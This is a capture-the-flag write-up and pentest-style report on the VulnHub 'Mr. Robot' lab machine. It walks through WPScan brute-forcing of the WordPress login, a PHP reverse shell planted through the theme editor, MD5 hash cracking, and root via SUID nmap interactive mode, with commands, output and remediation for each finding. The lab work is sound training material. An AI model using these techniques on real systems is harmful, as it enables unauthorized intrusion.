# MR. Robot

**Platform:** VulnHub
**OS:** Linux
**Tags:** WordPress, Brute Force, SUID, nmap interactive, 3 flags
**Date:** 2026-05-04

wpscan brute-forces WordPress admin credentials; the template editor deploys a PHP reverse shell as daemon. SUID nmap interactive mode gives root across three flags.

## 1. Enumeration

Started with a full port scan to identify running services on the machine.

```bash
nmap -sV -sC -p- <TARGET_IP>
```

Findings:
- 80/tcp - HTTP, Web server (Apache)
- 443/tcp - HTTPS, same web server
- 22/tcp - SSH, closed initially

## 2. Web Investigation

The website is themed around the Mr. Robot show. Explored the site for hidden clues and ran directory brute-forcing to find hidden paths.

```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

Findings:
- /robots.txt - Contains two entries: key file and a wordlist
- /wp-login.php - WordPress admin login, confirms CMS
- Key-1-of-3.txt - First flag found via robots.txt

Tip: Always check `/robots.txt` first. It's a goldmine. In this box it literally handed over the first flag and a custom wordlist.

## 3. Initial Foothold

WordPress was running. Used the custom wordlist found in robots.txt to brute-force the login, then uploaded a PHP reverse shell via the theme editor.

```bash
wpscan --url http://<TARGET_IP> --enumerate u
wpscan --url http://<TARGET_IP> -U elliot -P fsocity.dic
```

After gaining WordPress admin access, navigated to **Appearance - Theme Editor - 404.php** and replaced it with a PHP reverse shell.

```bash
nc -lvnp 4444
```

**Shell caught as:** daemon, low-privileged web user

Stabilised the shell and navigated to `/home/robot/`. Found a MD5 hashed password and `key-2-of-3.txt` (not readable yet).

```bash
# Crack the MD5 hash from password.raw-md5
john --format=raw-md5 hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

**Password cracked.** Switched to user `robot`. Retrieved key 2.

## 4. Privilege Escalation

Searched for SUID binaries to find a privilege escalation path.

```bash
find / -perm -u=s -type f 2>/dev/null
```

- nmap: Found with SUID bit set, old version with interactive mode

```bash
nmap --interactive
nmap> !sh
```

**Root shell obtained.** Retrieved key 3 from `/root/key-3-of-3.txt`

## 5. Flags

1. Found via `/robots.txt` during initial web enumeration
2. Found in `/home/robot/` after cracking MD5 hash and switching users
3. Found in `/root/` after SUID nmap privilege escalation

This was my first completed CTF machine. Mr. Robot taught me that enumeration is everything. The first flag was sitting in robots.txt the whole time. Never skip the basics.

---

## Penetration Test Report

**Target:** mrrobot.local
**Address:** <TARGET_IP>
**Assessment type:** Web application & Linux host assessment
**Assessment date:** 4 May 2026
**Environment:** VulnHub laboratory assessment
**Prepared by:** Ledion Mujaj
**Reference:** 01 / 10

---

## 1. Executive Summary

### Assessment outcome

Testing identified two critical and two high severity findings affecting **mrrobot.local** . The assessment chain progressed from web enumeration through WordPress brute-force authentication, PHP code execution via the CMS theme editor, hash cracking for user lateral movement, and finally privilege escalation via a SUID-enabled nmap binary.
Initial access was gained by brute-forcing the WordPress administrator password using a custom wordlist found in `/robots.txt` . With administrative access to WordPress, a PHP reverse shell was injected into a theme template file, yielding a shell as the `daemon` user. The robot user's MD5 hashed password was recovered from the filesystem and cracked offline. Root access was obtained by exploiting an old version of nmap with the SUID bit set, which permitted interactive shell spawning.

### Impact

The compromise chain crossed the application authentication boundary, the web application execution boundary, and the operating system privilege boundary. An attacker could alter all website content, read files accessible to the compromised accounts, and with root access modify system accounts, services and sensitive configuration files.

### Priority recommendations

1. Replace the brute-forced WordPress credentials and implement account lockout or rate limiting on the login form.
2. Prevent the WordPress theme editor from writing executable PHP files to the web root.
3. Replace MD5 password storage with a modern adaptive hash function such as bcrypt.
4. Remove the SUID bit from nmap or replace nmap with a version that does not support interactive mode.

## 2. Assessment Scope and Methodology

### 2.1 Target and observed services

| Asset | Address | Description |
| --- | --- | --- |
| mrrobot.local | <TARGET_IP> | Linux host; WordPress CMS on Apache; SSH closed at time of testing |
| Port | Service | Observed detail |
| --- | --- | --- |
| 80/tcp | HTTP | Apache web server; WordPress CMS; Mr. Robot themed content |
| 443/tcp | HTTPS | Same Apache instance over TLS |
| 22/tcp | SSH | Closed at time of assessment |

```
nmap -sV -sC -p- <TARGET_IP>

PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
443/tcp open   ssl/http Apache httpd
```

robots.txt was accessible at the web root and disclosed two entries: a key file (first flag) and a custom wordlist (fsocity.dic) used for the brute-force attack.

### 2.2 Approach

Web enumeration identified WordPress at the root. The robots.txt file disclosed a wordlist used subsequently for credential brute-forcing with WPScan. After administrative login, the theme editor was used to inject PHP. Post-shell enumeration found a password hash for the robot user. SUID binary search identified nmap as a privilege escalation path.

```
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt -x php,txt,html

/robots.txt     (Status: 200)
/wp-login.php   (Status: 200)
/wp-admin       (Status: 301)
```

### 2.3 Severity classification

| Rating | Assessment criteria |
| --- | --- |
| Critical | Direct, readily exploitable compromise with exceptional impact or reach. |
| High | Execution of arbitrary code, significant unauthorised access or escalation to administrative privileges. |
| Medium | Meaningful exposure with constrained impact or substantial exploitation prerequisites. |
| Low | Limited direct impact; improvement to an existing security control. |

## 3. Results Overview

### 3.1 Findings summary

| Reference | Finding | Severity | Page |
| --- | --- | --- | --- |
| [F-01](#f-01) | WordPress authentication brute-forced via application-disclosed wordlist | **Critical** | 6 |
| [F-02](#f-02) | PHP reverse shell injected via WordPress theme editor | **Critical** | 7 |
| [F-03](#f-03) | Insecure MD5 password hash stored in world-readable file | **Medium** | 8 |
| [F-04](#f-04) | SUID nmap binary permits interactive shell escape to root | **High** | 9 |

### 3.2 Compromise sequence

| Stage | Action | Access obtained |
| --- | --- | --- |
| 01 | robots.txt disclosed fsocity.dic wordlist; WPScan enumerated username elliot. | Wordlist and username recovered |
| 02 | WPScan brute-forced WordPress login using the disclosed wordlist. | WordPress administrator access |
| 03 | PHP reverse shell injected into 404.php via Appearance → Theme Editor. | Shell as daemon |
| 04 | MD5 hash for robot recovered from /home/robot/password.raw-md5 and cracked. | robot user shell via su |
| 05 | SUID nmap spawned interactive mode and escaped to /bin/sh. | Root shell |

### 3.3 Information disclosure note

The first flag was retrieved directly from the path listed in robots.txt without any exploitation. This represents an information disclosure finding; the flag path was accessible to any unauthenticated visitor.

## 4.1 WordPress Brute-Force Authentication

### F-01   WordPress login brute-forced with disclosed wordlist - CRITICAL

| Field | Assessment |
| --- | --- |
| Description | The WordPress installation exposed a custom wordlist at `/robots.txt` . WPScan enumerated the username `elliot` from the WordPress user enumeration endpoint. The same wordlist was used to brute-force the login for that account, yielding valid administrator credentials. The application applied no account lockout or rate limiting. |
| Prerequisites | HTTP access to the web server. No authentication required to read robots.txt or enumerate WordPress usernames. |
| Impact | Unauthenticated attacker obtains full WordPress administrator access. Administrator access enables PHP code injection (F-02), theme and plugin modification, and user account management. |
| Affected system | <TARGET_IP>:80 `/wp-login.php` |
| CVSS 3.1 | **9.8** (Critical) [AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.1#AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) |
| CWE | [CWE-307](https://cwe.mitre.org/data/definitions/307.html) : Improper Restriction of Excessive Authentication Attempts |

### Steps to reproduce

1. Navigate to `/robots.txt` to identify the wordlist file (e.g. `fsocity.dic` ).
2. Download the wordlist: `curl http://<TARGET_IP>/fsocity.dic -o wordlist.txt` .
3. Run wpscan: `wpscan --url http://<TARGET_IP>/ -U elliot -P wordlist.txt` .
4. Observe successful authentication with a discovered password.

### Evidence

```
# Step 1: robots.txt disclosed wordlist path
curl http://<TARGET_IP>/robots.txt
User-agent: *
fsocity.dic
key-1-of-3.txt

# Step 2: WPScan user enumeration
wpscan --url http://<TARGET_IP> --enumerate u
[+] Identified user: elliot

# Step 3: Brute-force with disclosed wordlist
wpscan --url http://<TARGET_IP> -U elliot -P fsocity.dic
[+] Valid combination found: elliot / [redacted]
```

Evidence E-01. WordPress credentials brute-forced using a wordlist the application disclosed in robots.txt. Password value redacted.

### Remediation

Remove the wordlist from robots.txt and from the web root entirely. Implement WordPress login rate limiting using a plugin or web server configuration. Enable two-factor authentication for administrative accounts. Replace weak passwords with strong, unique credentials that are not derived from application content.

## 4.2 PHP Code Execution via Theme Editor

### F-02   PHP reverse shell via Appearance → Theme Editor - CRITICAL

| Field | Assessment |
| --- | --- |
| Description | An authenticated WordPress administrator used the built-in theme editor (Appearance → Theme Editor) to overwrite `404.php` in the active theme with a PHP reverse shell. The web server executed the file when it was requested over HTTP, returning a shell as the `daemon` user. The theme editor permits arbitrary PHP to be written to the web root without restriction. |
| Prerequisites | WordPress administrator access. Provided by F-01. |
| Impact | Arbitrary command execution as the daemon web service account. All files readable or writable by daemon are accessible, including the WordPress database configuration and application files. |
| Affected system | <TARGET_IP>:80 `/wp-content/themes/[theme]/404.php` |
| CVSS 3.1 | **9.9** (Critical) [AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.1#AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H) |
| CWE | [CWE-94](https://cwe.mitre.org/data/definitions/94.html) : Improper Control of Generation of Code |

### Steps to reproduce

1. Authenticate to WordPress admin and navigate to Appearance > Theme Editor.
2. Replace a PHP file (e.g. `404.php` ) with a reverse shell payload.
3. Trigger the file by navigating to a non-existent URL on the target.
4. Receive a reverse shell as `daemon` .

### Evidence

```
# 404.php replaced with PHP reverse shell via WP admin panel
# Appearance → Theme Editor → 404 Template

nc -lvnp 4444

# Shell triggered by visiting any non-existent URL:
# http://<TARGET_IP>/nonexistent

$ id
uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

Evidence E-02. PHP reverse shell placed via the WordPress theme editor. Connection caught by netcat listener. Identity confirmed as daemon.

### Remediation

Disable the WordPress theme and plugin file editors by adding `define('DISALLOW_FILE_EDIT', true);` to `wp-config.php` . Separate the web service account from accounts with write access to theme files. Store themes outside the document root where possible, or configure the web server to block direct HTTP access to theme PHP files.

## 4.3 Insecure MD5 Password Storage

### F-03   World-readable MD5 hash in home directory - MEDIUM

| Field | Assessment |
| --- | --- |
| Description | The file `/home/robot/password.raw-md5` contained an MD5 hash of the robot user's password and was world-readable. The MD5 algorithm provides no meaningful resistance to offline cracking: the hash was cracked against rockyou.txt using John the Ripper and the plaintext was recovered. The cracked password was used with `su robot` to obtain a shell as robot. |
| Prerequisites | Read access to the filesystem as daemon. Provided by F-02. |
| Impact | Lateral movement to the robot account. Access to files readable only by robot, including the second flag. |
| Affected system | `/home/robot/password.raw-md5` |
| CVSS 3.1 | **5.5** (Medium) [AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N](https://www.first.org/cvss/calculator/3.1#AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N) |
| CWE | [CWE-916](https://cwe.mitre.org/data/definitions/916.html) : Use of Password Hash With Insufficient Computational Effort |

### Steps to reproduce

1. From the daemon shell, enumerate the robot user's home directory: `ls -la /home/robot/` .
2. Read the world-readable hash file: `cat /home/robot/password.raw-md5` .
3. Crack the MD5 hash offline: `john --format=raw-md5 hash.txt --wordlist=/usr/share/wordlists/rockyou.txt` .
4. Use the cracked password to switch to the robot user: `su robot` .
5. Confirm access to the second flag: `cat /home/robot/key-2-of-3.txt` .

### Evidence

```
daemon@linux:/home/robot$ ls -la
-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5

daemon@linux:/home/robot$ cat password.raw-md5
robot:[redacted MD5 hash]

# Offline cracking
john --format=raw-md5 hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
[redacted]   (robot)

daemon@linux:/home/robot$ su robot
Password: [redacted]
robot@linux:~$ cat key-2-of-3.txt
[redacted]
```

Evidence E-03. MD5 hash recovered from world-readable file and cracked offline. Password and flag values redacted.

### Remediation

Remove the plaintext and hashed credential files from the filesystem. Where password storage is necessary for system accounts, use shadow file entries with bcrypt or SHA-512 hashing. Apply restrictive permissions so that credential files are not world-readable.

## 4.4 SUID nmap Interactive Shell Escape

### F-04   SUID nmap permits root shell via interactive mode - HIGH

| Field | Assessment |
| --- | --- |
| Description | An older version of nmap was installed with the SUID bit set, running as root when invoked by any user. Older nmap versions include an interactive mode ( `nmap --interactive` ) that provides a prompt from which OS commands can be executed. The `!sh` command within interactive mode spawned a root shell, as nmap was executing with root privileges via the SUID bit. |
| Prerequisites | Access as any local user. The robot account obtained through F-01 to F-03 was used. |
| Impact | Arbitrary code execution as root. Full host compromise; all files, accounts and services accessible. |
| Affected system | `/usr/local/bin/nmap` (SUID root) |
| CVSS 3.1 | **7.8** (High) [AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.1#AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H) |
| CWE | [CWE-250](https://cwe.mitre.org/data/definitions/250.html) : Execution with Unnecessary Privileges |

### Steps to reproduce

1. Find SUID binaries: `find / -perm -4000 -type f 2>/dev/null` .
2. Identify nmap with SUID bit set.
3. Run nmap in interactive mode: `nmap --interactive` .
4. At the nmap prompt, type `!sh` to spawn a root shell.
5. Confirm: `id` .

### Evidence

```
robot@linux:~$ find / -perm -u=s -type f 2>/dev/null
/usr/local/bin/nmap
[additional SUID binaries]

robot@linux:~$ /usr/local/bin/nmap --interactive

Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh

# id
uid=1002(robot) gid=1002(robot) euid=0(root) groups=0(root),1002(robot)

# cat /root/key-3-of-3.txt
[redacted]
```

Evidence E-04. SUID nmap interactive mode used to obtain a root shell. euid=0 confirms root effective privileges. Flag redacted. Reference: [GTFOBins: nmap](https://gtfobins.github.io/gtfobins/nmap/) .

### Remediation

Remove the SUID bit from nmap: `chmod u-s /usr/local/bin/nmap` . Replace the outdated nmap installation with a current version. Current versions of nmap do not include interactive mode. Audit all SUID binaries regularly and remove the SUID bit from any binary that does not require it for its documented function.

## 5. Remediation and Assessment Closeout

### 5.1 Corrective action plan

| Priority | Action | Reference |
| --- | --- | --- |
| Immediate | Implement WordPress login rate limiting and remove disclosed wordlist from robots.txt. | F-01 |
| Immediate | Disable the WordPress theme file editor via wp-config.php. | F-02 |
| Immediate | Remove SUID bit from nmap and update to a current version. | F-04 |
| High | Remove world-readable credential files; replace MD5 with bcrypt for password storage. | F-03 |
No remediation retest is documented. Each finding includes verification criteria for closure.

### 5.2 Evidence and limitations

Evidence blocks are sourced from the [MR. Robot assessment walkthrough](mr-robot-vh.html) . Password values and flag contents are redacted from all evidence blocks.

### 5.3 Evidence index

| Reference | Supporting record |
| --- | --- |
| E-01 | Walkthrough section 2-3: robots.txt discovery and WPScan brute-force |
| E-02 | Walkthrough section 3: Theme editor PHP injection and daemon shell |
| E-03 | Walkthrough section 3: Hash extraction from home directory and su to robot |
| E-04 | Walkthrough section 4: SUID nmap interactive mode root shell |
